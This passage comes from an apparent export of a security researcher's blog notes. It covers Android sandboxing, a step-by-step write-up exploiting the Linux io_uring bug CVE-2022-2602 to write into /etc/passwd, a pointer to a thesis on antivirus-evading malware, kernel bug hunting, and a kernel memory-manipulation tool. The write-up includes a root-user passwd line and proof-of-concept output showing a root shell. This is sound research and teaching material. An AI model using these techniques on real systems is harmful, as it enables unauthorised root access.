GetApplicationContext().getSystemService(Context.WIFI_SERVICE);\n// Get the WifiState\nWifi_manager.getWifiState();\n[...]\n```\n\nWith these 2 lines of code we have completed our task:\n- Get a handle to the WiFi service. The return result of getSystemService() is a generic Object (the handle to the service) that needs to be casted based on the desired service.\n- From the retrieved manager, we can directly call the desired function, that will perform an IPC and return the result back.\n\nThat‚Äôs how Android abstract service interactions, enhancing security by simplifying application‚Äôs code.\n\nBy the way sometimes, due to performance reasons too, there is the necessity to run native code inside an application. This is performed using JNI, that permits to call native functions inside a shared library in the application context. This is pretty common for messaging applications (for example, whatsapp uses [PJSP](https://www.pjsip.org/), a C library, for video conferences).\n\n## Java Native Interface\nAs we said, sometimes there is the necessity to use native code such as C/C++ from standard applications. This is permitted using the JNI (Java Native Interface) that lets Java call native functions without drastic differences. The native code is exported in shared libraries inside the lib/ folder (of the APK) where we have binaries compiled for multiple architectures (32/64 bit ARM, x86/x86-64 ), and the the underline system will choose the appropriate one (based on its hardware).\nLet‚Äôs take an example with Whatsapp:\n\n![img2](/notes/images/android/1/2.png)\n\nIn this case, inside the lib/ folder there is only the armeabi-v7a folder. That‚Äôs because my test device is a 32 bit ARM (https://developer.android.com/ndk/guides/abis) and the system optimized physical space removing unused binaries compiled for other platforms.\nThese native functions are interesting from a security perspective because they can include **memory corruption issues**.\nIn order to track native calls, we can search through the Java code (decompiled) for native declarations:\n\n![img3](/notes/images/android/1/3.png)\n\nThat‚Äôs how a native function is declared, with the native keyword, and later on called as it is a normal Java function.\nIf you want to extract exported symbols from shared libraries, the nm utility can be come handy (*nm -D * | grep \\\u003cfunc_name\\\u003e* inside the specific ABI folder can be enough).\n\nIf you find an exploitable memory corruption in one application, you also have to consider the application sandbox. If you successfully compromise an application through a remote code execution, you are closed in a sandbox, where you can interact only with application‚Äôs related files and functionalities (and its declared android permissions). Of course, this can be part of a chain, with a foothold inside the system you have more attack surface in order to elevate privileges and compromise the system.\n\n## Application Sanbox\nCVE-2019-11932 is a Whatsapp Remote Code execution caused by a memory corruption while handling GIF animations ([here is a demo POC](https://www.youtube.com/watch?v=loCq8OTZEGI)). This was a critical issue because, also if you are in a sandbox, you can access all whatsapp files (chat databases, backup, media , ..) and, as we know, nowadays whatsapp is the main messaging application.\nAs we said, Android is a Linux based OS and inherits a lot of its concepts. In this way, Android uses kernel-level Application Sandbox using the UID (Unique User ID). Every application on Android has its own UID and GUID for file permissions and running application process (UID starts from 1000). All applications have a dedicated workspace in */data/data/\\\u003capp_name\\\u003e* created at the installation time where permissions permits only the application user to read and write in these files:\n\n![img4](/notes/images/android/1/4.png)\n\nAs you can see, only the user u0_a106 (10106, the UID for the WhatsApp application in my Droid) can access these files, meaning that any other application cannot read its content (only him and the root user).\nFor some applications (like browsers) there is an additional isolation that literally ‚Äòisolates‚Äô the application using a different UID. These IDs are referred in the Kernel source code as AID_ISOLATED_START (which is 99000) and AID_ISOLATED_END (99999) and limit service interactions. For example, the following snippet is part of the Android Kernel in order to obtain an handle to a service:\n\n\n```\nuint32_t do_find_service(const uint16_t *s, size_t len, uid_t uid, pid_t spid)\n{\n   //find_svc will retrieve a service info structure\n   struct svcinfo *si = find_svc(s, len);\n/.../\n   //check if the requested service allow interaction from isolated apps\n   if (!si-\u003eallow_isolated) {\n       // If this service doesn't allow access from isolated processes,\n       // then check the uid to see if it is isolated.\n       uid_t appid = uid % AID_USER;\n       if (appid \u003e= AID_ISOLATED_START \u0026\u0026 appid \u003c= AID_ISOLATED_END) {\n           return 0;\n       }\n   }\n/../\nreturn si-\u003ehandle\n\n```\n\nWe will deepin in next chapters about the full process to obtain a service handle, but from this snippet you can see where the isolation check is performed. A check is done in the svcinfo structure (structure with service information such as the name, the isolation level and more) and if the target service is not allowed to be called from isolated processes (the caller UID is between AID_ISOLATED_START and AID_ISOLATED_END) the service handle is not returned.\n\nFor example, this is the chrome browser inside an isolated process:\n\n![img5](/notes/images/android/1/5.png)\n\nYou can note that the user id is 99008 (\u003e99000), meaning it is an isolated application process.\n\n## Conclusion\nIn this first article, we introduced basic Android concepts and security aspects that will become handy for next chapters. In the next article, we are going to talk about the Binder, its transactions and the servicemanager.\n\n## References\n[http://newandroidbook.com/](http://newandroidbook.com/)\n[https://source.android.com/devices/tech/dalvik](https://source.android.com/devices/tech/dalvik)\u003c\n[https://source.android.com/security/app-sandbox](https://source.android.com/security/app-sandbox)","lastmodified":"2022-12-21T14:40:46.18257378Z","tags":null},"/notes/CVE-2022-2602-DirtyCred-File-Exploitation-applied-on-an-io_uring-UAF":{"title":"CVE-2022-2602: DirtyCred File Exploitation applied on an io_uring UAF","content":"\n# Introduction\nIn the past few weeks, I worked with [@LukeGix](https://exploiter.dev) (checkout his blog post on the same vulnerability [here](https://exploiter.dev/blog/2022/CVE-2022-2602.html)) to exploit the CVE-2022-2602, a very interesting bug from multiple perspectives without a public exploit, that impacts the io_uring subsystem with an Use-After-Free vulnerability handling registered file descriptors.\nWe used a Data-Only attack against kernel version 5.15.74 (the latest before the patch) taking inspiration from the DirtyCred technique recently presented at [BlackHat USA](https://zplin.me/papers/DirtyCred.pdf). \n\n# TL;DR\nThe vulnerability is an Use-After-Free that impacts the registered file descriptor functionality in the io_uring subsystem. It's possible to register a file in the io_uring context, free it from the Unix Garbage Collector and re-use it with the requested io_uring operation (for example, a `writev` operation). To exploit the bug, it was a matter of replace the freed file structure with a read-only file (e.g. /etc/passwd), in order to write into it, and achieve a good timing with a small race window.\n\n# Vulnerability\n## Root cause\nThe vulnerability is an Use-After-Free in the io_uring subsystem while handling registered files. The [IORING_REGISTER_FILES](https://manpages.debian.org/unstable/liburing-dev/io_uring_register.2.en.html#IORING_REGISTER_FILES) functionality permits to register file descriptors in the io_uring context so that the consumer (the user-land application) do not have to keep them open. It works by passing the list of file descriptors using the [io_uring_register](https://manpages.debian.org/unstable/liburing-dev/io_uring_register.2.en.html) syscall. However, the Unix Garbage collector (well explained in [this project zero blog post](https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html)), which its entrypoint is the [unix_gc](https://elixir.bootlin.com/linux/v5.15.74/source/net/unix/garbage.c#L205) function and its responsability is to de-allocate in-flight sockets, can free these registered files while io_uring is using them, causing an Use-After-Free vulnerability.\n\nThe vulnerability has been [discovered and described](https://seclists.org/oss-sec/2022/q4/57?utm_source=dlvr.it\u0026utm_medium=twitter) from \"Thadeu Lima de Souza Cascardo\" as following:\n\u003e The vulnerability is a use-after-free that happens when an io_uring request is being processed on a registered file and the Unix GC runs and frees the io_uring fd and all the registered fds. The order at which the Unix GC processes the inflight fds may lead to registered fds be freed before the io_uring is released and has the chance to unregister and wait for such requests to finish.\n\nPutting simple, in order to trigger the vulnerability, we have to register a file descriptor that can be used in an io_uring operation (like a `writev`) using [SQPOLL](https://unixism.net/loti/tutorial/sq_poll.html) and block the write operation using userfault (as demonstrated in the public POC, however we will use something else in our exploit) that will block the kernel thread. Now, close the io_uring context from user-land, triggers `unix_gc` function in some way (that will free the allocated registered file) and resumes the faulted kernel thread by releasing the userfault. In that way, the UAF should be triggered (with KASAN enabled, you can see a bug report).\n\n## Fix\nThe [fix](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=0091bfc81741b8d3aeb3b7ab8636f911b2de6e80) commit idea is pretty simple: Leave io_uring alone and let it handle these resources by itself [ignoring its registered files](https://elixir.bootlin.com/linux/latest/source/net/unix/garbage.c#L301). \nSimple and effective.\n\n# Exploitation\n## Exploitation strategies\nThe vulnerability can be approached using different techniques. Since the targeted [struct file](https://elixir.bootlin.com/linux/v5.15.75/source/include/linux/fs.h#L966) is in a dedicated cache (`filp`) a cross cache attack can be a viable approach, since the targeted object has a lot of interesting pointers and behaviours. However, we considered this possibility initially but we thought it would be a lot more reliabale to go with a data only technique. Replace the file struct with one in our control, perform some spray, and it could be possible (since the object is freed). Well, the idea was interesting, but we messed with a lot of things and, also if the exploit turned out quite simple, we put a lot of effort on it.\n\n## DirtyCred: File Exploitation\nThe DirtyCred attack is a technique presented this year at [Black Hat 2022](https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf). We are not going to further re-explain it since it has been already documented [in its original paper](https://zplin.me/papers/DirtyCred.pdf), but what is in our intereset is the \"File Exploitation\" part:\n![[Pasted image 20221209150049.png|800]] - *Image from [BH slides](https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf)*\n\nThe idea is pretty simple: If you replace a freed R/W file (while a kernel thread is writing into it) with a read-only file, you can write into that read-only file.\nBut, why and how? Let's start with the why. File permissions are [checked once](https://elixir.bootlin.com/linux/latest/source/fs/read_write.c#L568) before writing with the `write` syscall, once it starts writing (`file-\u003ef_op-\u003ewrite`) no more permissions checks are performed. So, if you are able to replace the `struct file` (retrieved from the `fd` integer number installed for that specific context) with an arbitrary one (e.g. a read-only file) **after** permissions are granted and **before** its write operation, you can write into arbitrary files bypassing permission validations. \nWell, but how? Mainly suspending the kernel execution thread when it starts writing, using [userfault](https://blog.hacktivesecurity.com/index.php/2022/06/13/linux-kernel-exploit-development-1day-case-study/), [FUSE](https://exploiter.dev/blog/2022/FUSE-exploit.html) or abusing file locking (Slow Write).\n\nWe choose to go with the file locking methodology in order to write an universal exploit that does not depend on specific configurations (also FUSE could be a good alternative, since unprivilged userfault has become a standard mitigation).\n\nI would like to tell some observations on this slow write technique, so let's see it from the kernel perspective.\n\n### File locking (Slow Write)\nThe file locking mechanism is a must feature for a kernel: If two concurrency processes are writing into the same file, the kernel must be able to account that and deal with it without loss of integrity. How the kernel does that? Using file locks.\n[Locking](https://en.wikipedia.org/wiki/Lock_(computer_science)) is a synchronization primitive that permits to handle access to the same resource in a multi-thread environment. \n[ext4_buffered_write_iter](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L253) is the function responsible to acquire this lock when a vectored write is requested (as in our case with io_uring), in a `ext4` file-sysytem, using the [inode_lock](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L263) (and later release it with [inode_unlock](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L273)), where the `inode` is our target file inode representation. If another thread is already writing into that node, the kernel thread is paused until the lock from the the other thread is released. When the other thread releases the file lock (calling `inode_unlock`), the sleeping kernel thread can resumes its execution acquiring the lock and starting to write into the file. But what if, during the sleep time, the `struct file` is replaced? Since permissions checks have been already done, the write action will be performed also if the re-allocated file has O_RDONLY permissions!\nIf you look closely in the [ext4_buffered_write_iter](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L253), you can see that the pointer to the struct file is retrieved from [iocb-\u003eki_filp](https://elixir.bootlin.com/linux/v5.15.75/source/include/linux/fs.h#L327), and the following calls will use that pointer to perform the write operation ([generic_perform_write](https://elixir.bootlin.com/linux/v5.15.75/C/ident/generic_perform_write)).\nWe used this technique to \"stays\" the object in the kernel and extend the race window, without using \"userfault\".\n\n#### fatal_signal_pending\nAn issue we encountered while developing the exploit was the [fatal_signal_pending](https://elixir.bootlin.com/linux/v5.15.75/C/ident/fatal_signal_pending) call from [generic_perform_write](https://elixir.bootlin.com/linux/v5.15.75/C/ident/generic_perform_write). This check ensures that the `current` context does not have fatal signals hanging, for example by avoiding the write operation if the process has been already closed. This was one of the issues we had to overcome that took us quite some time, since debugging these kinds of operations leads to non truthful behaviours. By the way, the resolution was just to wait until io_uring has finished its operation by monitoring our target file size:\n\n```C\nint main(){\n\t/* .. */\n\tstat(\"/etc/passwd\", \u0026st);\n\tint original_passwd_size = st.st_size;\n\t/* .. */\n\twhile(original_passwd_size == st.st_size){\n\t\tstat(\"/etc/passwd\", \u0026st);\n\t\tsize = st.st_size;\n\t\tsleep(2);\n\t}\n\t/* .. */\n}\n```\n\n## Exploitation Walktrough\nWe went a little bit inside the File Exploitation technique, now let's see how we abused it in order to write our exploit.\nWe have already seen how we can trigger the UAF in the \"Root Cause\" section, let's see in details how we developed the exploit.\n\n### Setup\nFirst, setup the io_uring context to work with the [Submission Queue Polling](https://unixism.net/loti/tutorial/sq_poll.html) mechanism and register a dummy file using the `io_uring_register` syscall.\n\n### Starting slow_write\nSince we want to replace the userfault technique in the published POC with another one, we choose to go with the Slow Write technique. As described before, we can pause a write operation abusing the file locking mechanism. Before letting io_uring write into the registered \"dummy file\", we want to \"slow write\" on that file (that means, write a lot of data that will take time and lock the file inode) in a way that the kernel thread responsible to perform the write operation in behalf of io_uring, will be waiting at the [inode_lock](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L263) call. In order to perform this slow write operation, we have been inspired from [this CVE-2022-2588 exploit](https://github.com/Markakd/CVE-2022-2588/blob/master/exp_file_credential.c#L558) function.\nNow that the write operation is paused, is the perfect time to trigger the UAF !\n\n### Free the registered file (trigger the UAF)\nIn order to trigger the UAF, we have to trigger the Unix Garbager Collector ([unix_gc](https://elixir.bootlin.com/linux/v5.15.74/source/net/unix/garbage.c#L205)) function in some way. That was not a big deal. First, because the POC already had a source line that did exactly that. Second, because every `unix_*` file operation calls it in its release function (example with [unix_stream_ops](https://elixir.bootlin.com/linux/v5.15.75/source/net/unix/af_unix.c#L744)): [unix_release](https://elixir.bootlin.com/linux/v5.15.75/source/net/unix/af_unix.c#L941) -\u003e [unix_release_sock](https://elixir.bootlin.com/linux/v5.15.75/source/net/unix/af_unix.c#L534) -\u003e [unix_gc call](https://elixir.bootlin.com/linux/v5.15.75/source/net/unix/af_unix.c#L606).\n\n```C\nclose(socket(AF_UNIX, SOCK_DGRAM, 0));\n```\n\nWith this simple one-line, `unix_gc` is triggered and our target file chunk should be freed!\n\n### Replace the target chunk\nNow, we have a freed chunk that can be re-used from another file allocation (since we are in a dedicated cache), and our objective is to re-allocate it with something in our control, like a sensitive file that we can open (the `open` syscall will allocate a `struct file` allocation in the `filp` cache) and let us perform a privileged operation by writing into it. Obviously, we went for \"/etc/passwd\" :}\n\nAs we described in the \"DirtyCred: File Exploitation\" section, since file permissions are checked once, we can easily re-allocate a read-only file, resumes the kernel thread we paused in the \"Starting slow_write\" section, and the write operation will be performed in that read-only file!\n\n#### Make the re-allocation more reliable\nSince the `filp` cache can be pretty busy (a lot of file operations and socket related stuff are inside this cache), a massive spray can be performed after the `unix_gc` is triggered, but it can be not enough. A good approach could also be to create some \"holes\" before triggering the targeted chunk re-allocation (to increase the FREELIST, but without releasing entire slabs), so that the following \"massive spray\" of \"/etc/passwd\" files would be more reliable.\n\n### Release the slow_write lock\nNow that we have replaced the victim chunk with a specific file, when the slow write operation finishes, the lock is released and the io_uring kernel thread acquires the lock and starts writing into our re-allocated file (\"/etc/passwd\"), also if it's allocated as read-only.\n\n### Overwrite /etc/passwd\nFirst, in order to just append text into \"/etc/passwd\" and not overwrite it from scratch, our victim file (the one that we have used as the victim chunk in our Use-After-Free) has been opened with the `O_APPEND` flag, that append text at the end of the file.\nWhat can we write into it? We can write a simple user using the following format, that will not require the password into \"\"/etc/shadow\":\n```bash\n\u003cUSER\u003e:\u003cHASH\u003e:0:0:/root:/root:/bin/sh\n```\n\n### POC || GTFO\nYou can find the full exploit here: https://github.com/kiks7/CVE-2022-2602-Kernel-Exploit.\n\n```bash\n/ $ uname -a\nLinux (none) 5.15.74 #20 SMP Sat Nov 19 14:01:51 CET 2022 x86_64 GNU/Linux\n/ $ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/sh\nuser:x:1000:1000:kiks,,,:/home/user:/bin/sh\n/ $ id\nuid=1000(user) gid=1000 groups=1000\n/ $ /poc\n[P] P1\n[P] P2\n[*] Creating thread for slow write on /tmp/rwA\n[*] Sleeping while waiting that slow_write starts ..\n[*][T1] Starting slow write ..\n[*][T1] Slowing write...\n[P] P3/P4\n[P] P5\n[*] Triggering unix_gc and freeing the registered fd\n[*] unix_gc finished !\n[P] P6\n[*] Spraying target files ..\n[*] Wait that slow_write finishes ..\n[P] P7/P8/P9\n[+][T1] slow_write finished\n[+] Slow write finished .. closing io_uring fd\n[*] Waits that the io_uring thread continues the writev operation while the process is still alive\n[+] Everything done !\nPassword:\nuid=0(root) gid=0 groups=0\n[+] DONE\n/ $ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/sh\nuser:x:1000:1000:kiks,,,:/home/user:/bin/sh\npwn:$6$pwn$5m1zBfEzD3xCg.wOtCtlKePwQL3Y5UiVAQBEAIv67Ir9JfZjmjO7XwzMzk0IcRoPjtWg.k2ytbimpKp1s/RB2/:0:0:/root:/root:/bin/sh\n/ $\n```\n\n# Extra: new KRWX feature\n[KRWX](https://github.com/kiks7/KRWX) is a tool I developed to deepen kernel internals and to assists kernel exploitation. Since in this case it was necessary to deal with a specific special cache (`filp`) and this feature wasn't implemented, I added it. Now it's possible to retrieve the address of a specific `kmem_cache` using `kmem_cache_get(char* name)`, like the following:\n```C\n#include \"lib/krwx.h\"\nint main(){\n\t/* .. */\n\tkmem_cache_get(\"filp\");\n\t/* .. */\n}\n```\n\nIt will return the kernel address of the cache that can be used to allocate objects into it using the already present user-land `kmem_cache_alloc()` (with some internal changes to accomodate the implementation). You can find the [full example here](https://github.com/kiks7/KRWX/blob/main/client/example/kmem_cache_get.c), but this is an extract:\n```C\n#include \"lib/krwx.h\"\nint main(){\n\t/* .. */\n\tfilp = kmem_cache_get(\"filp\");\n\tchunk = kmem_cache_alloc(filp, GFP_KERNEL);\n\tkmem_cache_free(filp, chunk);\n\t/* .. *\n}\n```\n\nIf you are interested, you can find the project on [github](https://github.com/kiks7/KRWX).\n\n# Conclusions\nThis is how we managed to exploit the CVE-2022-2602 using the inode locking technique. It was a really fun (and sometimes pain) adventure and it was a pleasure to have worked on it with Luca ([@LukeGix](https://exploiter.dev)). You can take a look at [his blog post](https://exploiter.dev/blog/2022/CVE-2022-2602.html) to see how it's possible to exploit the same vulnerability with userfaultd and FUSE techniques! \n\nStay tuned for more!\n\n## References\n- https://exploiter.dev/blog/2022/CVE-2022-2602.html\n- https://github.com/kiks7/CVE-2022-2602-Kernel-Exploit\n- https://github.com/kiks7/KRWX\n- https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html\n- https://github.com/Markakd/CVE-2022-2588/\n- https://zplin.me/papers/DirtyCred.pdf\n- https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf\n- https://blog.hacktivesecurity.com/index.php/2022/06/13/linux-kernel-exploit-development-1day-case-study/\n- https://exploiter.dev/blog/2022/FUSE-exploit.html\n- https://en.wikipedia.org/wiki/Lock_(computer_science)\n- https://seclists.org/oss-sec/2022/q4/57?utm_source=dlvr.it\u0026utm_medium=twitter\n- https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/","lastmodified":"2022-12-21T14:40:46.18257378Z","tags":null},"/notes/How-To-Write-FUD-Malware-Thesis":{"title":"How to Write FUD Malware [Thesis]","content":"\nI wrote this thesis in the last high school year, it was my introduction to the low-level world that quickly turned into the exploitation part of it.\nBtw it's about malware development on Windows environments with the discovery of some FUD techniques that could bypass some Antivirus defenses (at the time of writing).\n\n![[notes/images/fud/fud_thesis.pdf]]\n\nIf you fear PDF 0days, check it out from [exploit-db](https://www.exploit-db.com/docs/42206) (the english version is not translated by me)","lastmodified":"2022-12-21T14:40:46.18257378Z","tags":null},"/notes/Hunting-for-Linux-kernel-public-vulnerabilities":{"title":"Hunting for Linux kernel public vulnerabilities","content":"\n\n## Introduction\nRecently was looking for a vulnerability that permitted me to practise what I've learned during the last few months on Linux Kernel Exploitation with a \"real-life\" scenario. Since I had a week to dedicate my time in Hacktive Security to deepen a specific argument, I decided to search for a public vulnerability without a public exploit to develop it by myself. The next blog post will be related to the development of that 1day, this one is a quick post about how I discovered and choose the vulnerability using online sources, since I didn't found anything similar online.\n\n## TL;DR\nThis blog post is about public resourses to identify known vulnerabilities in the Linux Kernel in order to practise some Kernel Exploitation in a real-life scenario. These resources includes: BugZilla, SyzBot, changelogs and git logs.\n\n## Public bugs\nThe first thing I asked myself was: how do I find a suitable bug for my purpose? I excluded searching it by CVE since not all vulnerabilities have an assigned CVE (and usually they are the most \"famous\" ones) and that's when I used the most powerful hacking skill: googling. That led me to various resources that I would like to share today starting by saying that that's only the result of my personal work that could not reflect the best way to perform the same job. That said, this is what I've used to find my \"matched\" Nday:\n\n-   Bugzilla\n-   SyzBot\n-   Changelogs\n-   Git log\n\nKernel changelogs is definetly my favourite one but let's say few words on all of them.\n\n### BugZilla\n[BugZilla](https://bugzilla.kernel.org/) is the standard way to [report bugs](https://www.kernel.org/doc/html/v4.19/admin-guide/reporting-bugs.html) in the upstream Linux kernels. You can find interesting vulnerabilities organised by subsystem (e.g. Networking with IPv4 and IPv6 or file system with ext* types and so on) and you can also search for keywords (such as \"overflow\", \"heap\", \"UAF\" and so on ..) using the standard search or the more advanced one. The personal downside is the mix of a lot of \"non vulnerabilities\", hangs and stuff like that. Also, you do not have the most powerful search options (e.g. some bash). However, it is still a good option and I personally pinned few vulnerabilities that i excluded afterwards.\n\n### Syzbot\n\"syzbot is a continuous fuzzing/reporting system based on syzkaller fuzzer\" [source](https://lwn.net/Articles/749910/).  \nNot the best GUI but at least you can have a lot of potentially open and fixed vulnerabilties. There isn't a built-in search option but you can use your browser's one or parse the HTML with an HTML parser. One of the downside, beyond the lack of searching, is the presence of tons of false-positives (in the \"Open section\"). However, upsides are pretty good: you can find open vulnerabilites (still not fixed), reproducers (C or syzlang), fixed commits and reported issues have the syzkaller nomenclature that is pretty self-explainationary.\n\n#### Syzkaller-bugs (Google Group)\nThe lack of a search functionality in syz-bot is well replaced by the [\"syzkaller-bugs\" Google Group](https://groups.google.com/g/syzkaller-bugs/) from where you can find syz-bot reported bugs with additional information from the comment section and an enanched search bar. I really enjoy this option !\n\n### Changelogs\nThat's my favourite method: download all changelogs from the [kernel CDN](https://cdn.kernel.org/pub/linux/kernel/VERSION/) of your desired kernel version and you can enjoy all downloaded files with your favourite bash commands. This approach is similar to search from git commits but with the advantage that it is way faster. With some bash-fu, you can download all changelogs for a target kernel version (e.g. 4.x) with the following inline:¬†`URL=https://cdn.kernel.org/pub/linux/kernel/v4.x/ \u0026\u0026 curl $URL | grep \"ChangeLog-4.9\" | grep -v '.sign' | cut -d \"\\\"\" -f 2 | while read line; do wget \"$URL/$line\"; done`.  \nOnce all changelogs have been downloaded it's possible to¬†`grep`¬†for juicy keywoards like UAF, OOB, overflow and so on. I found very useful to display text before and after the selected keyword, like:¬†`grep -A5 -B5 UAF *`. In that way, you can instantly have quick information about vulnerability details, impacted subsystem, limitations, ..  \nFor each identified vulnerability, it's possible to see its patch by diffing the patch commit with the previous one (linux source from git is needed):¬†`git diff \u003ccommit before\u003e \u003ccommit patch\u003e`.\n\n### Git log\nAs said before, this is a similar approach to the \"Changelogs\" method. The concept is pretty simple: clone the github repository and search for juicy keywoards in the commit history. You can do that with the following commands:\n\n```bash\ngit clone git://git.kernel.org/pub/scm/linux/kernel/git/stable/linux-stable.git\ncd linux-stable\ngit checkout -f \u003cTAG -\u003e # e.g. git checkout -f v4.9.316 (from https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git)\ngit log \u003e ../git.log\n```\n\nIn that way, you can do the same thing as before on¬†`git.log`¬†file. The big downside, however, is that the file is too big and it takes more time (11.429.573 lines on 4.9.316). That's the reason why I prefer the \"Changelog\" method.\n\n## Personal Experience\nI was searching for an Use-After-Free vulnerability and I started to search for it in all mentioned resources: BugZilla, SyzBot, Changelogs and git history. I wrote them down in a table with a resume description in order to further analyze them later on. I started to dig into few of them viewing their patch and source code in order to understand reachability, compile dependencies and exploitability. I strumbled into an interesting one: a vulnerability in the RAWMIDI interface (commit c13f1463d84b86bedb664e509838bef37e6ea317). I discovered it with the \"Changelog\" method, by searching for the¬†\"UAF\"¬†keyword reading the previous and next five lines:¬†`grep -A5 -B5 UAF *`. By seeing its behaviours, I was convinced to go with that vulnerability, an Use-After-Free triggered in a race condition.\n\n## Conclusion\nI illustrated my experience on finding a public vulnerability to practise some linux kernel exploitation using public resources. The next blog post will be about the mentioned vulnerability in the RAWMIDI interface with all steps involved in the exploitation phase.\n\n## References\n- https://bugzilla.kernel.org/  \n- https://www.kernel.org/doc/html/v4.19/admin-guide/reporting-bugs.html  \n- https://lwn.net/Articles/749910/  \n- https://groups.google.com/g/syzkaller-bugs/  \n- https://cdn.kernel.org/pub/linux/kernel/VERSION/\n","lastmodified":"2022-12-21T14:40:46.18257378Z","tags":null},"/notes/KRWX-Kernel-Read-Write-Execute":{"title":"KRWX: Kernel Read Write Execute","content":"\n## Introduction\ngithub project: https://github.com/kiks7/KRWX\n\nDuring the last few months/year I was studying and approaching the Kernel Exploitation subject and during this journey I developed few tools that assissted me (and currently assist) on better understanding specific topics. Today I want to release my favourine one: KRWX (**K**ernel **R**ead **W**rite **E**xecute). It is a simple LKM (Linux Kernel Module) that lets you play with kernel memory, allocate and free kernel objects directly from user-land!\n\n## What\nThe main goal of this tool is to use kernel functions from userland (from C code) in order to avoid slower kernel debugging and developing of kernel modules to demostrate specific vulnerabilities (instead, you can emulate them with provided IOCTLs). Also, it can assist the exploitation phase.\nThese are the project main features (all these features are accessible from a low level user from user-land):\n- Read and write into kernel memory\n- Read entire blocks of memory\n- Arbitrary allocate objects directly calling `kmalloc`\n- Arbitrary `kfree` objects (and also free arbitrary addresses, if you want)\n- Allocate/free multiple objects\n- Log every `copy_[from|to]_user`/ `kmalloc`/`kfree` called by the KRWX module through hooking (readable from `dmesg`).\n\nMainly, a more powerful read and write primitive :]\n\n## Why\nInitially I was writing this module to study the SLUB memory allocator in Linux by allocating, freeing and re-allocating arbitrary chunks easily from an userland process. That automatically leads to study also some exploitation techniques that, with this module, I found a lot easier to understand since you can easily play with kernel memory as you are the god of your system. Then I started to heavily use it for multiple purposes and that's the reason why I'm sharing it.\n\n## How\nThese are some exported functions:\n- `void* kmalloc(size_t arg_size, gfp_t flags)` -\u003e Allocate a chunk with specific `size` and `flag` options.\n-  `int kfree(void* address)` -\u003e Free arbitrary chunks by their `address` (also, you can free arbitrary memory).\n- `unsigned long int kread64(void* address)` -\u003e Read 8 bytes of memory at `address`.\n- `int kwrite64(void* address, uint64_t value)` -\u003e Write 8 bytes specified by `value` into `address`.\n- `void read_memory(void* start_address, size_t size)` -\u003e Read `size` amount of memory starting from `start_address`.\n\nAnd, since one of my favourite hobby is overengineer and I'm lazy enough to do not want to write loops everytime:\n- `void multiple_kmalloc(void** array, uint32_t n_objs, uint32_t size)` -\u003e Allocate `n_objs` number of objects with specified `size` and return addresses in `array`.\n- `void multiple_kfree(void** array, uint64_t to_free[], uint64_t to_free_size)` -\u003e Free specified addresses in `to_free` from `array` (`to_free_size` is the size of the `to_free` array).\n\n If you're interested in the source code feel free to check out the github project.\n\n## Examples\n### Allocate, free and read arbitrary chunks\nYou can find the full source code in `example/01.c`. Here will follows some snippets and a little walkthrough.\n\nFirst, include the external library and call its initialization function (`init_krwx`):\n```C\n#include \"./lib/krwx.h\"\n\nint main(){\n\tinit_krwx();\n\t[..]\n}\n\t\n```\nSo, 10 chunks with size 256 are allocated using `multiple_kmalloc`, and the memory of the 7th allocation is read using `read_memory` after writing `0x4141414141414141` at its first bytes:\n```C\nvoid* chunks[10];\nmultiple_kmalloc(\u0026chunks, 10, 256);\nkwrite64(chunks[7], 0x4141414141414141);\nread_memory(chunks[7], 0x10);\n```\n\nThe indexes 3, 4 and 7 of the `chunks` array are freed using `multiple_kfree`:\n```C\nuint64_t to_free[] = {3, 4, 7};\nmultiple_kfree(\u0026chunks, \u0026to_free, ( sizeof(to_free) / sizeof(uint64_t) ) );\n```\n\nOnce they are freed, new chunks with the same size are allocated and initialized with `0x4343434343434343`, and the memory of the 7h freed chunk is displayed using `read_memory` again:\n```C\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nread_memory(chunks[7], 0x10);\n\n```\n\nThe result is:\n```bash\n[*] Allocating 10 chunks with size 256\n[*] Allocated @0xffffffc00503b900\n[*] Allocated @0xffffffc00503b600\n[*] Allocated @0xffffffc00503b100\n[*] Allocated @0xffffffc00503bc00\n[*] Allocated @0xffffffc00503b400\n[*] Allocated @0xffffffc00503b000\n[*] Allocated @0xffffffc00503b500\n[*] Allocated @0xffffffc00503b800\n[*] Allocated @0xffffffc00503ba00\n[*] Allocated @0xffffffc00503bd00\n0xffffffc00503b800:     0x4141414141414141 0xffffffc0001a8928\n[*] Freeing @0xffffffc00503bc00\n[*] Freeing @0xffffffc00503b400\n[*] Freeing @0xffffffc00503b800\n0xffffffc00503b800:     0x4343434343434343 0xffffffc0001a8928\n```\n\nWith  few lines of code has been demostrated how  our 7th chunk has been replaced with a new one after it has been freed (the `read_memory` targeted the `chunks[7]`). \nAs simple as it is, it has been written for demonstration purposes.\n\n### Use-After-Free\nTo simulate a UAF scenario it's simple as few lines of code:\n```C\nvoid* chunk = kmalloc(\u003cSIZE\u003e, \u003cFLAGS\u003e);\nkfree(chunk);\n// Allocate your target chunk\n// Simulate UAF using k[write|read]64()\n```\n\nFor example, if we want to simulate an attack scenario where we want to replace our vulnerable freed chunk with a target object (for example an `iovec` struct) we can allocate a chunk with `kmalloc` and later  `kfree` it just before allocating the target structure:\n```C\n// Allocate the vulnerable object\nvoid* chunk = kmalloc(150, _GFP_KERN);\n// Allocate target object\nstruct iovec iov[10] = {0};\nchar iov_buf[0x100];\niov[0].iov_base = 